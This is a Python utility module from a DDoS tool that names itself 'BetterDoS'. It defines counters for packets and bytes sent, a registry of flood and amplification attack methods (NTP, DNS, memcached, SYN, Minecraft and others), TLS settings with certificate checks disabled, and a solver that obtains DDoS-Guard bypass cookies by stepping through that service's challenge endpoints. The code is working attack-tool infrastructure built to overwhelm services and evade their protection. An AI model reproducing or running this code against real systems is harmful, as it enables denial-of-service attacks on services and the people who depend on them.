"""Shared runtime state, utilities, and constants."""

from json import load
from logging import DEBUG, FileHandler, Formatter, basicConfig, getLogger, shutdown
from math import log2, trunc
from multiprocessing import RawValue
from os import getenv
from pathlib import Path
from re import compile
from socket import AF_INET, SOCK_DGRAM, socket
from ssl import CERT_NONE, SSLContext, create_default_context
import ssl
from typing import Set

from certifi import where
from requests import Response, Session, cookies

# ── Paths ────────────────────────────────────────────────────────────────
ROOT_DIR: Path = Path(__file__).resolve().parent.parent

# ── Logging ──────────────────────────────────────────────────────────────
basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s',
            datefmt="%H:%M:%S")
logger = getLogger("BetterDoS")
logger.setLevel("DEBUG" if getenv("MHD_DEBUG", "0") == "1" else "INFO")

from uuid import uuid4
RUN_ID = uuid4().hex[:8]

_log_file = getenv("MHD_LOG_FILE", "").strip()
if _log_file:
    _fh = FileHandler(_log_file)
    _fh.setFormatter(Formatter('[%(asctime)s - %(levelname)s] %(message)s', "%H:%M:%S"))
    logger.addHandler(_fh)

# ── TLS context ──────────────────────────────────────────────────────────
ctx: SSLContext = create_default_context(cafile=where())
ctx.check_hostname = False
ctx.verify_mode = CERT_NONE
if hasattr(ctx, "minimum_version") and hasattr(ssl, "TLSVersion"):
    ctx.minimum_version = ssl.TLSVersion.TLSv1_2
if hasattr(ssl, "OP_NO_TLSv1"):
    ctx.options |= ssl.OP_NO_TLSv1
if hasattr(ssl, "OP_NO_TLSv1_1"):
    ctx.options |= ssl.OP_NO_TLSv1_1

# ── Config ───────────────────────────────────────────────────────────────
with open(ROOT_DIR / "config.json") as _f:
    con = load(_f)

# ── Local IP ─────────────────────────────────────────────────────────────
__ip__ = None
with socket(AF_INET, SOCK_DGRAM) as _s:
    _s.connect(("9.9.9.9", 80))
    __ip__ = _s.getsockname()[0]


# ── Colors ───────────────────────────────────────────────────────────────
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


# ── Exit helper ──────────────────────────────────────────────────────────
def exit(*message):
    if message:
        logger.error(bcolors.FAIL + " ".join(message) + bcolors.RESET)
    shutdown()
    from sys import exit as _exit
    _exit(1)


# ── Counter ──────────────────────────────────────────────────────────────
class Counter:
    def __init__(self, value=0):
        self._value = RawValue('i', value)

    def __iadd__(self, value):
        self._value.value += value
        return self

    def __int__(self):
        return self._value.value

    def set(self, value):
        self._value.value = value
        return self


REQUESTS_SENT = Counter()
BYTES_SEND = Counter()


# ── Methods registry ─────────────────────────────────────────────────────
class Methods:
    LAYER7_METHODS: Set[str] = {
        "CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "DYN", "SLOW",
        "HEAD", "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", "AVB",
        "CFBUAM", "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER",
        "KILLER", "TOR", "RHEX", "STOMP",
    }

    LAYER4_AMP: Set[str] = {
        "MEM", "NTP", "DNS", "ARD", "CLDAP", "CHAR", "RDP",
    }

    LAYER4_METHODS: Set[str] = {
        *LAYER4_AMP, "TCP", "UDP", "SYN", "VSE", "MINECRAFT", "MCBOT",
        "CONNECTION", "CPS", "FIVEM", "FIVEM-TOKEN", "TS3", "MCPE",
        "ICMP", "OVH-UDP",
    }

    ALL_METHODS: Set[str] = {*LAYER4_METHODS, *LAYER7_METHODS}


# ── Static utilities ─────────────────────────────────────────────────────
class Tools:
    IP = compile(r"(?:\d{1,3}\.){3}\d{1,3}")
    protocolRex = compile(r'"protocol":(\d+)')

    @staticmethod
    def humanbytes(i: int, binary: bool = False, precision: int = 2):
        MULTIPLES = [
            "B", "k{}B", "M{}B", "G{}B", "T{}B", "P{}B", "E{}B", "Z{}B", "Y{}B"
        ]
        if i > 0:
            base = 1024 if binary else 1000
            multiple = trunc(log2(i) / log2(base))
            value = i / pow(base, multiple)
            suffix = MULTIPLES[multiple].format("i" if binary else "")
            return f"{value:.{precision}f} {suffix}"
        else:
            return "-- B"

    @staticmethod
    def humanformat(num: int, precision: int = 2):
        suffixes = ['', 'k', 'm', 'g', 't', 'p']
        if num > 999:
            obje = sum(
                [abs(num / 1000.0 ** x) >= 1 for x in range(1, len(suffixes))])
            return f'{num / 1000.0 ** obje:.{precision}f}{suffixes[obje]}'
        else:
            return num

    @staticmethod
    def sizeOfRequest(res: Response) -> int:
        size: int = len(res.request.method)
        size += len(res.request.url)
        size += len('\r\n'.join(f'{key}: {value}'
                                for key, value in res.request.headers.items()))
        return size

    @staticmethod
    def send(sock: socket, packet: bytes):
        global BYTES_SEND, REQUESTS_SENT
        if not sock.send(packet):
            return False
        BYTES_SEND += len(packet)
        REQUESTS_SENT += 1
        return True

    @staticmethod
    def sendto(sock, packet, target):
        global BYTES_SEND, REQUESTS_SENT
        if not sock.sendto(packet, target):
            return False
        BYTES_SEND += len(packet)
        REQUESTS_SENT += 1
        return True

    @staticmethod
    def dgb_solver(url, ua, pro=None):
        s = None
        idss = None
        with Session() as s:
            if pro:
                s.proxies = pro
            hdrs = {
                "User-Agent": ua,
                "Accept": "text/html",
                "Accept-Language": "en-US",
                "Connection": "keep-alive",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-User": "?1",
                "TE": "trailers",
                "DNT": "1"
            }
            with s.get(url, headers=hdrs) as ss:
                for key, value in ss.cookies.items():
                    s.cookies.set_cookie(cookies.create_cookie(key, value))
            hdrs = {
                "User-Agent": ua,
                "Accept": "*/*",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Referer": url,
                "Sec-Fetch-Dest": "script",
                "Sec-Fetch-Mode": "no-cors",
                "Sec-Fetch-Site": "cross-site"
            }
            with s.post("https://check.ddos-guard.net/check.js", headers=hdrs) as ss:
                for key, value in ss.cookies.items():
                    if key == '__ddg2':
                        idss = value
                    s.cookies.set_cookie(cookies.create_cookie(key, value))

            hdrs = {
                "User-Agent": ua,
                "Accept": "image/webp,*/*",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Cache-Control": "no-cache",
                "Referer": url,
                "Sec-Fetch-Dest": "script",
                "Sec-Fetch-Mode": "no-cors",
                "Sec-Fetch-Site": "cross-site"
            }
            with s.get(f"{url}.well-known/ddos-guard/id/{idss}", headers=hdrs) as ss:
                for key, value in ss.cookies.items():
                    s.cookies.set_cookie(cookies.create_cookie(key, value))
                return s

        return False

    @staticmethod
    def safe_close(sock=None):
        if sock:
            sock.close()
